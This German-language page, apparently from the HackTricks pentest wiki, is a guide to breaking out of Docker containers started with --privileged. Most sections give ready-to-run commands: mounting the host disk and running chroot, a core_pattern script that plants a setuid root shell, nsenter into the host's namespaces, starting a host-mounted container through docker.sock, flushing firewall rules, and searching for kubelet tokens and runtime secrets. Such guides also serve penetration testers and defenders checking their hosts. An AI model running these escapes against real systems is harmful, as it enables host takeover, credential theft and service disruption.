# Aus `--privileged`-Containern entkommen

{{#include ../../../banners/hacktricks-training.md}}

## Überblick

Ein mit `--privileged` gestarteter Container ist nicht dasselbe wie ein normaler Container mit ein oder zwei zusätzlichen Berechtigungen. In der Praxis entfernt oder schwächt `--privileged` mehrere standardmäßige Laufzeitschutzmechanismen, die die Workload normalerweise von gefährlichen Host-Ressourcen fernhalten. Die genaue Wirkung hängt weiterhin von der Runtime und dem Host ab, aber bei Docker ist das übliche Ergebnis:

- alle Capabilities werden gewährt
- die Einschränkungen der Device-cgroup werden aufgehoben
- viele Kernel-Dateisysteme werden nicht mehr schreibgeschützt eingebunden
- standardmäßig maskierte procfs-Pfade verschwinden
- die seccomp-Filterung wird deaktiviert
- die AppArmor-Einschränkung wird deaktiviert
- die SELinux-Isolation wird deaktiviert oder durch ein wesentlich umfassenderes Label ersetzt

Die wichtige Konsequenz ist, dass ein privilegierter Container normalerweise **keinen** subtilen Kernel-Exploit benötigt. In vielen Fällen kann er einfach direkt mit Host-Geräten, hostseitigen Kernel-Dateisystemen oder Runtime-Schnittstellen interagieren und anschließend in eine Host-Shell wechseln.

## Was `--privileged` nicht automatisch ändert

`--privileged` tritt **nicht** automatisch den PID-, Netzwerk-, IPC- oder UTS-Namespaces des Hosts bei. Ein privilegierter Container kann weiterhin über private Namespaces verfügen. Das bedeutet, dass einige Escape-Ketten eine zusätzliche Bedingung erfordern, zum Beispiel:

- ein Host-Bind-Mount
- gemeinsam genutzte Host-PIDs
- Host-Netzwerk
- sichtbare Host-Geräte
- beschreibbare proc/sys-Schnittstellen

Diese Bedingungen lassen sich bei realen Fehlkonfigurationen oft leicht erfüllen, sind konzeptionell jedoch von `--privileged` selbst getrennt.

## Escape-Pfade

### 1. Die Host-Festplatte über freigelegte Geräte einbinden

Ein privilegierter Container sieht normalerweise deutlich mehr Geräteknoten unter `/dev`. Wenn das Blockgerät des Hosts sichtbar ist, besteht der einfachste Escape darin, es einzubinden und mit `chroot` in das Host-Dateisystem zu wechseln:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Wenn die Root-Partition nicht offensichtlich ist, ermittle zuerst das Block-Layout:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Wenn der praktische Weg darin besteht, einen setuid helper in einem beschreibbaren Host-Mount statt mit `chroot` zu platzieren, beachte, dass nicht jedes Dateisystem das setuid-Bit berücksichtigt. Eine schnelle hostseitige Prüfung der Fähigkeiten ist:
```bash
mount | grep -v "nosuid"
```
Dies ist nützlich, weil beschreibbare Pfade unter `nosuid`-Dateisystemen für klassische Workflows wie „eine setuid-Shell ablegen und später ausführen“ deutlich weniger interessant sind.

Die hier ausgenutzten abgeschwächten Schutzmechanismen sind:

- vollständige Gerätefreigabe
- weitreichende Capabilities, insbesondere `CAP_SYS_ADMIN`

Verwandte Seiten:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Einen Host-Bind-Mount einbinden oder wiederverwenden und `chroot`

Wenn das Root-Dateisystem des Hosts bereits innerhalb des Containers eingebunden ist oder der Container die erforderlichen Mounts erstellen kann, weil er privileged ist, ist eine Host-Shell oft nur ein `chroot` entfernt:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Wenn kein Host-Root-Bind-Mount vorhanden ist, aber der Host-Speicher erreichbar ist, erstelle einen:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Dieser Pfad missbraucht:

- abgeschwächte Mount-Einschränkungen
- vollständige Capabilities
- fehlende MAC-Einschränkung

Verwandte Seiten:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Beschreibbares `/proc/sys` oder `/sys` missbrauchen

Eine der wesentlichen Folgen von `--privileged` ist, dass die Schutzmechanismen von procfs und sysfs deutlich schwächer werden. Dadurch können hostseitige Kernel-Schnittstellen offengelegt werden, die normalerweise maskiert oder schreibgeschützt eingehängt sind.

Ein klassisches Beispiel ist `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Weitere besonders wertvolle Pfade umfassen:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Dieser Pfad nutzt Folgendes aus:

- fehlende maskierte Pfade
- fehlende schreibgeschützte Systempfade

Verwandte Seiten:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Vollständige Capabilities für einen Mount- oder Namespace-basierten Escape verwenden

Ein privilegierter Container erhält die Capabilities, die normalerweise aus Standardcontainern entfernt werden, darunter `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` und viele weitere. Das reicht oft aus, um einen lokalen Foothold in einen Host-Escape umzuwandeln, sobald eine weitere exponierte Angriffsfläche vorhanden ist.

Ein einfaches Beispiel ist das Mounten zusätzlicher Dateisysteme und die Verwendung des Namespace-Eintritts:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Wenn die Host-PID ebenfalls geteilt wird, wird der Schritt noch kürzer:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Dieser Pfad missbraucht:

- den standardmäßigen Satz privilegierter Capabilities
- das optionale Teilen der Host-PID

Verwandte Seiten:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Escape über Runtime-Sockets

Ein privilegierter Container verfügt häufig über sichtbare Runtime-Zustände oder -Sockets des Hosts. Wenn ein Docker-, containerd- oder CRI-O-Socket erreichbar ist, besteht der einfachste Ansatz oft darin, die Runtime-API zu verwenden, um einen zweiten Container mit Hostzugriff zu starten:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Für containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Dieser Pfad missbraucht:

- privilegierten Runtime-Zugriff
- über die Runtime selbst erstellte Host-Bind-Mounts

Verwandte Seiten:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Nebenwirkungen der Netzwerkisolation entfernen

`--privileged` tritt nicht automatisch dem Netzwerk-Namespace des Hosts bei. Wenn der Container jedoch zusätzlich über `--network=host` oder einen anderen Host-Netzwerkzugriff verfügt, wird der gesamte Netzwerk-Stack veränderbar:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Dies ist nicht immer eine direkte Host-Shell, kann jedoch zu Denial of Service, Traffic interception oder Zugriff auf ausschließlich an Loopback gebundene Management-Dienste führen.

Verwandte Seiten:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Host-Secrets und Laufzeitstatus lesen

Selbst wenn ein sauberer Shell-Escape nicht sofort möglich ist, verfügen privilegierte Container oft über ausreichenden Zugriff, um Host-Secrets, den kubelet-Status, Laufzeitmetadaten und die Dateisysteme benachbarter Container zu lesen:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Wenn `/var` vom Host gemountet ist oder die Runtime-Verzeichnisse sichtbar sind, kann dies bereits vor dem Erlangen einer Host-Shell für laterale Bewegungen oder den Diebstahl von Cloud/Kubernetes-Credentials ausreichen.

Verwandte Seiten:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Checks

Der Zweck der folgenden Befehle besteht darin, zu bestätigen, welche privileged-container escape families unmittelbar nutzbar sind.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Was ist hier interessant:

- ein vollständiger Capability-Satz, insbesondere `CAP_SYS_ADMIN`
- beschreibbarer Zugriff auf proc/sys
- sichtbare Host-Geräte
- fehlende seccomp- und MAC-Einschränkungen
- Runtime-Sockets oder Bind-Mounts des Host-Root-Verzeichnisses

Jeder dieser Punkte kann für post-exploitation ausreichen. Mehrere zusammen bedeuten normalerweise, dass der Container funktional nur ein oder zwei Befehle von einer Host-Kompromittierung entfernt ist.

## Verwandte Seiten

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
